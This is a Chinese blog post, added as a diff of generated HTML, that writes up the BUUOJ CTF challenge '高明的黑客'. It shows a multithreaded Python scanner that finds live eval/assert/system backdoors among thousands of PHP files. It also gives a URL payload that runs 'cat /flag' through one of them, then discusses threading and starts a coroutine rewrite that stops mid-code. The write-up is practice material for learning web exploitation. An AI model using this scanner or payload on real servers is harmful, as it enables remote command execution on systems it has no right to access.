@@ -1,0 +1,886 @@
+<!DOCTYPE html>
+
+
+
+  
+
+
+<html class="theme-next muse use-motion" lang="zh-Hans">
+<head><meta name="generator" content="Hexo 3.9.0">
+  <meta charset="UTF-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+<meta name="theme-color" content="#222">
+
+
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform">
+<meta http-equiv="Cache-Control" content="no-siteapp">
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css">
+
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css">
+
+<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css">
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=5.1.4">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=5.1.4" color="#222">
+
+
+
+
+
+  <meta name="keywords" content="note,">
+
+
+
+
+
+
+
+
+
+
+<meta name="description" content="The Third Day for Web前言别问Second去哪了，拿去完成第一天的任务了，我凑~ 今天继续来到buuoj看题，先看看高明的黑客 高明的黑客先下载源码，然后看看发现里面会有一堆垃圾代码，但是也存在$_GET, $_POST，只不过几乎都被“封印”了，所以（面向wp做题）就知道要写脚本，给get，post传参构造能制造回显的参数，然后看是否有回显，有回显则证明那个地方可以被利用。">
+<meta name="keywords" content="note">
+<meta property="og:type" content="article">
+<meta property="og:title" content="The Third Day for Web">
+<meta property="og:url" content="http://yoursite.com/2019/07/30/The_Third_Day_for_Web/index.html">
+<meta property="og:site_name" content="V&#39;s blog">
+<meta property="og:description" content="The Third Day for Web前言别问Second去哪了，拿去完成第一天的任务了，我凑~ 今天继续来到buuoj看题，先看看高明的黑客 高明的黑客先下载源码，然后看看发现里面会有一堆垃圾代码，但是也存在$_GET, $_POST，只不过几乎都被“封印”了，所以（面向wp做题）就知道要写脚本，给get，post传参构造能制造回显的参数，然后看是否有回显，有回显则证明那个地方可以被利用。">
+<meta property="og:locale" content="zh-Hans">
+<meta property="og:image" content="http://yoursite.com/2019/07/30/The_Third_Day_for_Web/1564375540326.png">
+<meta property="og:image" content="http://yoursite.com/2019/07/30/The_Third_Day_for_Web/1564375712837.png">
+<meta property="og:image" content="http://yoursite.com/2019/07/30/The_Third_Day_for_Web/1564375802994.png">
+<meta property="og:image" content="http://yoursite.com/2019/07/30/The_Third_Day_for_Web/1564380595459.png">
+<meta property="og:image" content="http://yoursite.com/2019/07/30/The_Third_Day_for_Web/1564380610278.png">
+<meta property="og:image" content="http://yoursite.com/2019/07/30/The_Third_Day_for_Web/1564382532801.png">
+<meta property="og:image" content="http://yoursite.com/2019/07/30/The_Third_Day_for_Web/14466168501989.png!small">
+<meta property="og:image" content="http://yoursite.com/2019/07/30/The_Third_Day_for_Web/14466168807902.png!small">
+<meta property="og:updated_time" content="2019-07-30T11:30:31.012Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="The Third Day for Web">
+<meta name="twitter:description" content="The Third Day for Web前言别问Second去哪了，拿去完成第一天的任务了，我凑~ 今天继续来到buuoj看题，先看看高明的黑客 高明的黑客先下载源码，然后看看发现里面会有一堆垃圾代码，但是也存在$_GET, $_POST，只不过几乎都被“封印”了，所以（面向wp做题）就知道要写脚本，给get，post传参构造能制造回显的参数，然后看是否有回显，有回显则证明那个地方可以被利用。">
+<meta name="twitter:image" content="http://yoursite.com/2019/07/30/The_Third_Day_for_Web/1564375540326.png">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Muse',
+    version: '5.1.4',
+    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
+    fancybox: true,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    duoshuo: {
+      userId: '0',
+      author: '博主'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="http://yoursite.com/2019/07/30/The_Third_Day_for_Web/">
+
+
+
+
+
+  <title>The Third Day for Web | V's blog</title>
+  
+
+
+
+
+
+
+
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/" class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">V's blog</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <p class="site-subtitle">Daily life of a rookie</p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br>
+            
+            首页
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-about">
+          <a href="/about/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-user"></i> <br>
+            
+            关于
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-tags">
+          <a href="/tags/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br>
+            
+            标签
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-categories">
+          <a href="/categories/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-th"></i> <br>
+            
+            分类
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br>
+            
+            归档
+          </a>
+        </li>
+      
+
+      
+    </ul>
+  
+
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/07/30/The_Third_Day_for_Web/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="V">
+      <meta itemprop="description" content>
+      <meta itemprop="image" content="/images/avatar.jpg">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="V's blog">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">The Third Day for Web</h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2019-07-30T19:25:55+08:00">
+                2019-07-30
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <h1 id="The-Third-Day-for-Web"><a href="#The-Third-Day-for-Web" class="headerlink" title="The Third Day for Web"></a>The Third Day for Web</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>别问Second去哪了，拿去完成第一天的任务了，我凑~</p>
+<p>今天继续来到buuoj看题，先看看高明的黑客</p>
+<h3 id="高明的黑客"><a href="#高明的黑客" class="headerlink" title="高明的黑客"></a>高明的黑客</h3><p>先下载源码，然后看看发现里面会有一堆垃圾代码，但是也存在$_GET, $_POST，只不过几乎都被“封印”了，所以（面向wp做题）就知道要写脚本，给get，post传参构造能制造回显的参数，然后看是否有回显，有回显则证明那个地方可以被利用。</p>
+<p>赵师傅脚本如下：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"><span class="keyword">from</span> concurrent.futures.thread <span class="keyword">import</span> ThreadPoolExecutor</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">session = requests.Session()</span><br><span class="line"></span><br><span class="line">path = <span class="string">"/Users/jinzhao/PhpstormProjects/qwb/web2/"</span>  <span class="comment"># 文件夹目录</span></span><br><span class="line">files = os.listdir(path)  <span class="comment"># 得到文件夹下的所有文件名称</span></span><br><span class="line"></span><br><span class="line">mutex = threading.Lock()</span><br><span class="line">pool = ThreadPoolExecutor(max_workers=<span class="number">50</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">read_file</span><span class="params">(file)</span>:</span></span><br><span class="line">    f = open(path + <span class="string">"/"</span> + file);  <span class="comment"># 打开文件</span></span><br><span class="line">    iter_f = iter(f);  <span class="comment"># 创建迭代器</span></span><br><span class="line">    str = <span class="string">""</span></span><br><span class="line">    <span class="keyword">for</span> line <span class="keyword">in</span> iter_f:  <span class="comment"># 遍历文件，一行行遍历，读取文本</span></span><br><span class="line">        str = str + line</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 获取一个页面内所有参数</span></span><br><span class="line">    start = <span class="number">0</span></span><br><span class="line">    params = &#123;&#125;</span><br><span class="line">    <span class="keyword">while</span> str.find(<span class="string">"$_GET['"</span>, start) != <span class="number">-1</span>:</span><br><span class="line">        pos2 = str.find(<span class="string">"']"</span>, str.find(<span class="string">"$_GET['"</span>, start) + <span class="number">1</span>)</span><br><span class="line">        var = str[str.find(<span class="string">"$_GET['"</span>, start) + <span class="number">7</span>: pos2]</span><br><span class="line">        start = pos2 + <span class="number">1</span></span><br><span class="line"></span><br><span class="line">        params[var] = <span class="string">'echo("glzjin");'</span></span><br><span class="line"></span><br><span class="line">        <span class="comment"># print(var)</span></span><br><span class="line"></span><br><span class="line">    start = <span class="number">0</span></span><br><span class="line">    data = &#123;&#125;</span><br><span class="line">    <span class="keyword">while</span> str.find(<span class="string">"$_POST['"</span>, start) != <span class="number">-1</span>:</span><br><span class="line">        pos2 = str.find(<span class="string">"']"</span>, str.find(<span class="string">"$_POST['"</span>, start) + <span class="number">1</span>)</span><br><span class="line">        var = str[str.find(<span class="string">"$_POST['"</span>, start) + <span class="number">8</span>: pos2]</span><br><span class="line">        start = pos2 + <span class="number">1</span></span><br><span class="line"></span><br><span class="line">        data[var] = <span class="string">'echo("glzjin");'</span></span><br><span class="line"></span><br><span class="line">        <span class="comment"># print(var)</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># eval test</span></span><br><span class="line">    r = session.post(<span class="string">'http://localhost:11180/web2/'</span> + file, data=data, params=params)</span><br><span class="line">    <span class="keyword">if</span> r.text.find(<span class="string">'glzjin'</span>) != <span class="number">-1</span>:</span><br><span class="line">        mutex.acquire()</span><br><span class="line">        print(file + <span class="string">" found!"</span>)</span><br><span class="line">        mutex.release()</span><br><span class="line"></span><br><span class="line">    <span class="comment"># assert test</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> params:</span><br><span class="line">        params[i] = params[i][:<span class="number">-1</span>]</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> data:</span><br><span class="line">        data[i] = data[i][:<span class="number">-1</span>]</span><br><span class="line"></span><br><span class="line">    r = session.post(<span class="string">'http://localhost:11180/web2/'</span> + file, data=data, params=params)</span><br><span class="line">    <span class="keyword">if</span> r.text.find(<span class="string">'glzjin'</span>) != <span class="number">-1</span>:</span><br><span class="line">        mutex.acquire()</span><br><span class="line">        print(file + <span class="string">" found!"</span>)</span><br><span class="line">        mutex.release()</span><br><span class="line"></span><br><span class="line">    <span class="comment"># system test</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> params:</span><br><span class="line">        params[i] = <span class="string">'echo glzjin'</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> data:</span><br><span class="line">        data[i] = <span class="string">'echo glzjin'</span></span><br><span class="line"></span><br><span class="line">    r = session.post(<span class="string">'http://localhost:11180/web2/'</span> + file, data=data, params=params)</span><br><span class="line">    <span class="keyword">if</span> r.text.find(<span class="string">'glzjin'</span>) != <span class="number">-1</span>:</span><br><span class="line">        mutex.acquire()</span><br><span class="line">        print(file + <span class="string">" found!"</span>)</span><br><span class="line">        mutex.release()</span><br><span class="line"></span><br><span class="line">    <span class="comment"># print("====================")</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> file <span class="keyword">in</span> files:  <span class="comment"># 遍历文件夹</span></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> os.path.isdir(file):  <span class="comment"># 判断是否是文件夹，不是文件夹才打开</span></span><br><span class="line">        <span class="comment"># read_file(file)</span></span><br><span class="line"></span><br><span class="line">        pool.submit(read_file, file)</span><br></pre></td></tr></table></figure>
+
+<p>运行结果如下：<img src="/2019/07/30/The_Third_Day_for_Web/1564375540326.png" alt="1564375540326"></p>
+<p>然后去到这个文件，</p>
+<p><img src="/2019/07/30/The_Third_Day_for_Web/1564375712837.png" alt="1564375712837"></p>
+<p>找到利用点在这里，</p>
+<p>所以构造payload</p>
+<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="regexp">//</span>web15.buuoj.cn<span class="regexp">/xk0SzyKwfzw.php?Efa5BVG=cat%20/</span>flag</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2019/07/30/The_Third_Day_for_Web/1564375802994.png" alt="1564375802994"></p>
+<h4 id="learning"><a href="#learning" class="headerlink" title="learning"></a>learning</h4><p>这里用的是赵师傅的脚本，感觉自己写脚本能力太差了，所以今天就是自己写一份脚本，然后觉得赵师傅这里的脚本还可以再完善一下，可以直接拿flag的那种。</p>
+<p>一下是构造脚本的，心路历程</p>
+<p>首先，嫖一手赵师傅的文件名读取</p>
+<figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">import os</span><br><span class="line"></span><br><span class="line">path = <span class="string">"D:/phpstudy/PHPTutorial/WWW/src/"</span>  <span class="comment"># 文件夹目录</span></span><br><span class="line">files = os.listdir(path)  <span class="comment"># 得到文件夹下的所有文件名称</span></span><br></pre></td></tr></table></figure>
+
+<p>然后套路：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>
+
+<p>main()函数呢</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">for</span> file <span class="keyword">in</span> files:</span><br><span class="line">        readfile(file)</span><br></pre></td></tr></table></figure>
+
+<p>接下来是最重要的函数readfile了</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">readfile</span><span class="params">(file)</span>:</span></span><br><span class="line">    <span class="keyword">with</span> open(path+<span class="string">'/'</span>+file,<span class="string">"r"</span>) <span class="keyword">as</span> f:</span><br><span class="line">        content = str(f.read())					//读取一个文件内容赋值给content</span><br></pre></td></tr></table></figure>
+
+<p>然后嫖赵师傅的获取get和post形参的代码</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">	start = <span class="number">0</span></span><br><span class="line">    params = &#123;&#125;</span><br><span class="line">    <span class="keyword">while</span> str.find(<span class="string">"$_GET['"</span>, start) != <span class="number">-1</span>:		//找到$_GET[<span class="string">'，返回$的位置</span></span><br><span class="line"><span class="string">        pos2 = str.find("'</span>]<span class="string">", str.find("</span>$_GET[<span class="string">'", start) + 1)   //从找到$后的位置开始找'</span>]，返回<span class="string">'的位置</span></span><br><span class="line"><span class="string">        var = str[str.find("$_GET['</span><span class="string">", start) + 7: pos2]		//根据返回的两个位置，切片，得到形参	</span></span><br><span class="line"><span class="string">        start = pos2 + 1	//开始找下一个$_GET['</span></span><br><span class="line"><span class="string">        params[var] = 'echo("</span>glzjin<span class="string">");'			//给所有形参赋值，比如，XXX = echo("</span>glzjin<span class="string">");</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">        # print(var)</span></span><br><span class="line"><span class="string">#post同理</span></span><br><span class="line"><span class="string">    start = 0</span></span><br><span class="line"><span class="string">    data = &#123;&#125;</span></span><br><span class="line"><span class="string">    while str.find("</span>$_POST[<span class="string">'", start) != -1:</span></span><br><span class="line"><span class="string">        pos2 = str.find("'</span>]<span class="string">", str.find("</span>$_POST[<span class="string">'", start) + 1)</span></span><br><span class="line"><span class="string">        var = str[str.find("$_POST['</span><span class="string">", start) + 8: pos2]</span></span><br><span class="line"><span class="string">        start = pos2 + 1</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">        data[var] = 'echo("</span>glzjin<span class="string">");'</span></span><br></pre></td></tr></table></figure>
+
+<p>然后是测试文件中发现的三种可利用函数，eval，assert，system</p>
+<p>（先引入request模块）</p>
+<figure class="highlight elm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line"><span class="title">session</span> = requests.<span class="type">Session</span>()</span><br></pre></td></tr></table></figure>
+
+<p>eval：</p>
+<figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">r = session.<span class="built_in">post</span>(<span class="string">'http://127.0.0.1/src/'</span> + <span class="built_in">file</span>, data=data, <span class="built_in">params</span>=<span class="built_in">params</span>)	<span class="comment">	//构成eval(echo("glzjin");)</span></span><br><span class="line">    <span class="keyword">if</span> r.<span class="keyword">text</span>.find(<span class="string">'glzjin'</span>) != <span class="number">-1</span>:</span><br><span class="line">        print(<span class="built_in">file</span> + <span class="string">" found!"</span>)</span><br></pre></td></tr></table></figure>
+
+<p>了解一下requests这个模块，这里的 session.post里头，data应该是post请求的内容，而params应该是get请求的内容</p>
+<p>assert:</p>
+<figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">params</span>:</span><br><span class="line">      <span class="built_in">params</span>[i] = <span class="built_in">params</span>[i][:<span class="number">-1</span>]		<span class="comment">	//去掉分号</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> i <span class="keyword">in</span> data:</span><br><span class="line">      data[i] = data[i][:<span class="number">-1</span>]</span><br><span class="line"></span><br><span class="line">  r = session.<span class="built_in">post</span>(<span class="string">'http://127.0.0.1/src/'</span> + <span class="built_in">file</span>, data=data, <span class="built_in">params</span>=<span class="built_in">params</span>)	<span class="comment">	//构成asser(echo("glzjin"))</span></span><br><span class="line">  <span class="keyword">if</span> r.<span class="keyword">text</span>.find(<span class="string">'glzjin'</span>) != <span class="number">-1</span>:</span><br><span class="line">      print(<span class="built_in">file</span> + <span class="string">" found!"</span>)</span><br></pre></td></tr></table></figure>
+
+<p>system:</p>
+<figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">params</span>:</span><br><span class="line">	<span class="built_in">params</span>[i] = <span class="string">'echo glzjin'</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> data:</span><br><span class="line">    data[i] = <span class="string">'echo glzjin'</span></span><br><span class="line"></span><br><span class="line">r = session.<span class="built_in">post</span>(<span class="string">'http://127.0.0.1/src/'</span> + <span class="built_in">file</span>, data=data, <span class="built_in">params</span>=<span class="built_in">params</span>)	<span class="comment">	//构成system(echo glzjin)</span></span><br><span class="line"><span class="keyword">if</span> r.<span class="keyword">text</span>.find(<span class="string">'glzjin'</span>) != <span class="number">-1</span>:</span><br><span class="line">    print(<span class="built_in">file</span> + <span class="string">" found!"</span>)</span><br></pre></td></tr></table></figure>
+
+<p>三种语法对应三种函数的测试</p>
+<p>差不多就这样，去测试一下用时，先看赵师傅的多线程用时（没错，对脚本的改进就是这个用时问题）</p>
+<p>（嘶~        一开脚本，cpu就100%，）</p>
+<p><img src="/2019/07/30/The_Third_Day_for_Web/1564380595459.png" alt="1564380595459"></p>
+<p><img src="/2019/07/30/The_Third_Day_for_Web/1564380610278.png" alt="1564380610278"></p>
+<p><img src="/2019/07/30/The_Third_Day_for_Web/1564382532801.png" alt="1564382532801"></p>
+<p>一共用时679秒，十一分钟多（发现其实三种函数都能引起回显）</p>
+<p>然后我们试试我们那个没用多线程的（找点什么事打发时间嘞，，，）</p>
+<p>去做了一组四分钟的tabata，然后发现任务管理器里，虽然cup占用率是100，但一次只发现一个windows command processing，而赵师傅的多线程一次是七八个，难道这个脚本要跑一个多小时？</p>
+<p>那趁着这个机会，先看看赵师傅的多线程，然后去学学协程</p>
+<p>先列出赵师傅脚本中属于多线程的代码</p>
+<figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> concurrent.futures.thread <span class="keyword">import</span> ThreadPoolExecutor		<span class="comment">//线程池</span></span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"></span><br><span class="line">mutex = threading.Lock()</span><br><span class="line">mutex.acquire()</span><br><span class="line">mutex.release()</span><br><span class="line"></span><br><span class="line">pool = ThreadPoolExecutor(max_workers=<span class="number">50</span>)		<span class="comment">//设置线程的最大数</span></span><br><span class="line">pool.submit(read_file, <span class="keyword">file</span>)</span><br></pre></td></tr></table></figure>
+
+<ol>
+<li><p><code>ThreadPoolExecutor</code>构造实例的时候，传入<code>max_workers</code>参数来设置线程池中最多能同时运行的线程数目。</p>
+</li>
+<li><p>使用<code>submit</code>函数来提交线程需要执行的任务（函数名和参数）到线程池中，并返回该任务的句柄（类似于文件、画图），注意<code>submit()</code>不是阻塞的，而是立即返回。</p>
+</li>
+</ol>
+<p>​    链接：<a href="https://www.jianshu.com/p/b9b3d66aa0be" target="_blank" rel="noopener">https://www.jianshu.com/p/b9b3d66aa0be</a></p>
+<p>然后里面有个锁的概念</p>
+<p>当多线程中需要“独占资源”的时候，要使用锁来控制，防止多个线程同时占用资源而出现其他异常。使用锁的时候就调用acquire()方法，以此告诉其他线程，我正在占用该资源，你们要等会；待使用资源后需要释放资源的时候就调用release()方法，告诉其他线程，我已经完成使用该资源了，其他人可以过来使用了。</p>
+<p>但我觉得，因为一个线程是在使用某个资源前加的锁，其他线程怎么知道你给谁加了锁，所以是不是，一加锁，其他线程就停了呢？待验证。</p>
+<p>这里，我自己的脚本大概要听一下了，一共3002个文件，跑一个文件用时1s，大概真的要50分钟到一个小时了，那我们来试试协程</p>
+<figure class="highlight sqf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br></pre></td><td class="code"><pre><span class="line">import os</span><br><span class="line">import requests</span><br><span class="line">import <span class="built_in">time</span></span><br><span class="line">import asyncio</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">session = requests.Session()</span><br><span class="line"></span><br><span class="line">path = <span 